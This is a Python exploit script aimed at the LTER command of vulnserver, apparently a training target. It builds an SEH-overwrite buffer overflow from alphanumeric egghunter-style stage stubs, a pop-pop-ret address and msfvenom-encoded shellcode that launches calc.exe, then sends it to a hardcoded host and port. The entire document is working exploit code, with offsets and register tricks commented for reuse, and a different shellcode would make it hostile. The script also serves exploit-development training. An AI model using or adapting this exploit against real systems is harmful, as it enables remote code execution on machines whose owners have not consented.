import socket

host = "192.168.1.45"
port = 9999

#msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe -e x86/alpha_mixed BufferRegister=EAX -f python
shellcode =  b""
shellcode += b"\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
shellcode += b"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
shellcode += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x78"
shellcode += b"\x68\x6d\x52\x47\x70\x57\x70\x43\x30\x45\x30"
shellcode += b"\x4f\x79\x69\x75\x66\x51\x4f\x30\x30\x64\x4e"
shellcode += b"\x6b\x46\x30\x66\x50\x4c\x4b\x61\x42\x56\x6c"
shellcode += b"\x4c\x4b\x73\x62\x55\x44\x4e\x6b\x50\x72\x36"
shellcode += b"\x48\x36\x6f\x4d\x67\x31\x5a\x71\x36\x56\x51"
shellcode += b"\x6b\x4f\x4c\x6c\x35\x6c\x65\x31\x73\x4c\x54"
shellcode += b"\x42\x54\x6c\x45\x70\x6b\x71\x68\x4f\x64\x4d"
shellcode += b"\x57\x71\x4b\x77\x49\x72\x38\x72\x50\x52\x36"
shellcode += b"\x37\x6e\x6b\x56\x32\x56\x70\x4c\x4b\x33\x7a"
shellcode += b"\x35\x6c\x4c\x4b\x50\x4c\x52\x31\x72\x58\x49"
shellcode += b"\x73\x53\x78\x33\x31\x4b\x61\x56\x31\x4c\x4b"
shellcode += b"\x30\x59\x67\x50\x56\x61\x58\x53\x6e\x6b\x73"
shellcode += b"\x79\x36\x78\x7a\x43\x77\x4a\x67\x39\x4e\x6b"
shellcode += b"\x77\x44\x4c\x4b\x77\x71\x68\x56\x70\x31\x6b"
shellcode += b"\x4f\x6e\x4c\x5a\x61\x48\x4f\x34\x4d\x75\x51"
shellcode += b"\x38\x47\x77\x48\x59\x70\x31\x65\x58\x76\x37"
shellcode += b"\x73\x51\x6d\x39\x68\x75\x6b\x33\x4d\x45\x74"
shellcode += b"\x54\x35\x6a\x44\x51\x48\x6c\x4b\x70\x58\x31"
shellcode += b"\x34\x46\x61\x69\x43\x53\x56\x6e\x6b\x66\x6c"
shellcode += b"\x50\x4b\x4e\x6b\x42\x78\x77\x6c\x66\x61\x69"
shellcode += b"\x43\x4c\x4b\x66\x64\x6e\x6b\x65\x51\x78\x50"
shellcode += b"\x4d\x59\x31\x54\x71\x34\x54\x64\x51\x4b\x63"
shellcode += b"\x6b\x51\x71\x51\x49\x43\x6a\x70\x51\x4b\x4f"
shellcode += b"\x59\x70\x53\x6f\x63\x6f\x30\x5a\x6c\x4b\x46"
shellcode += b"\x72\x78\x6b\x6c\x4d\x33\x6d\x70\x6a\x36\x61"
shellcode += b"\x6c\x4d\x6d\x55\x38\x32\x65\x50\x37\x70\x77"
shellcode += b"\x70\x32\x70\x30\x68\x56\x51\x6e\x6b\x52\x4f"
shellcode += b"\x6d\x57\x4b\x4f\x38\x55\x4f\x4b\x7a\x50\x68"
shellcode += b"\x35\x4d\x72\x66\x36\x50\x68\x4e\x46\x6f\x65"
shellcode += b"\x6d\x6d\x4f\x6d\x79\x6f\x48\x55\x47\x4c\x47"
shellcode += b"\x76\x63\x4c\x47\x7a\x4d\x50\x6b\x4b\x6b\x50"
shellcode += b"\x52\x55\x64\x45\x6f\x4b\x43\x77\x76\x73\x34"
shellcode += b"\x32\x62\x4f\x42\x4a\x37\x70\x31\x43\x69\x6f"
shellcode += b"\x6b\x65\x50\x63\x65\x31\x42\x4c\x32\x43\x46"
shellcode += b"\x4e\x43\x55\x74\x38\x61\x75\x37\x70\x41\x41"


def connection(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024)

    except:
        print("[-]Error connecting with host...")

    return s

def payload():
    nseh = "\x70\x86\x71\x86" # jo $-120; jno $-120 , but 0x86 is a bad character, translated to +24 bytes
    seh = "\x2b\x17\x50\x62" # pop pop ret 0x6250172b

    seh_offset = 3518
    stage1_offset = 3529
    stage2_offset = 3457
    shellcode_offset = 1610

    # crafting stage1

    #push esp; pop eax
    stage1 = "\x54"
    stage1 += "\x58"

    #add eax, 0x00001354: stack-align
    stage1 += "\x05\x64\x23\x10\x10" #add eax, 0x10102364
    stage1 += "\x2d\x10\x10\x10\x10" #sub eax, 0x10101010

    #push eax; pop esp
    stage1 += "\x50"
    stage1 += "\x5c"

    #cleaning eax register
    stage1 += "\x25\x10\x10\x10\x10" #and eax, 0x10101010
    stage1 += "\x25\x01\x01\x01\x01" #and eax, 0x01010101

    #jmp $-120: add eax, 0x909086eb
    stage1 += "\x05\x7b\x76\x70\x70" #add eax, 0x7070767b
    stage1 += "\x05\x70\x10\x20\x20" #add eax, 0x20201070

    #push eax
    stage1 += "\x50"

    #crafting stage2

    #push esp; pop eax
    stage2 = "\x54"
    stage2 += "\x58"

    #sub eax, 0x00000034: stack-align
    stage2 += "\x2d\x44\x10\x10\x10" #sub eax, 0x10101044
    stage2 += "\x05\x10\x10\x10\x10" #add eax, 0x10101010

    #push eax; pop esp
    stage2 += "\x50"
    stage2 += "\x5c"

    #sub eax, 0x00000770: make eax point to shellcode
    stage2 += "\x2d\x71\x08\x10\x10" #sub eax, 0x10100871
    stage2 += "\x05\x01\x01\x10\x10" #add eax, 0x10100101

    #push eax; pop ebx: make ebx pointing to shellcode
    stage2 += "\x50"
    stage2 += "\x5b"

    #cleaning eax regsiter
    stage2 += "\x25\x10\x10\x10\x10" #and eax, 0x10101010
    stage2 += "\x25\x01\x01\x01\x01" #and eax, 0x0101010

    #jmp ebx: add eax, 0x9090e3ff
    stage2 += "\x05\x77\x73\x70\x70" #add eax, 0x70707377
    stage2 += "\x05\x77\x60\x10\x10" #add eax, 0x10106077
    stage2 += "\x05\x11\x10\x10\x10" #add eax, 0x10101011

    #push eax
    stage2 += "\x50"

    buffer = 'A' * shellcode_offset
    buffer += shellcode
    buffer += 'A' * (stage2_offset-len(buffer))
    buffer += stage2
    buffer += 'A' * (seh_offset-len(buffer))
    buffer += nseh
    buffer += seh
    buffer += 'B' * (stage1_offset-len(buffer))
    buffer += stage1
    buffer += 'C' * (7000-len(buffer))

    return buffer

def exploit(s, payload):
    print ("[*] Sending payload to LTER")

    command = "LTER ."

    try:
        s.send(command + payload)
        s.close()
        print ("\t[+]Payload sent")

    except:
        print("\t[-]Error sending payload...")



def printText():
    print('[*]Exploit by l3x4overflow\n')
    print('[*]Exploiting vulnserver LTER...')

def main():
    printText()

    s = connection(host, port)
    buffer = payload()

    exploit(s, buffer)

if __name__ == '__main__':
    main()
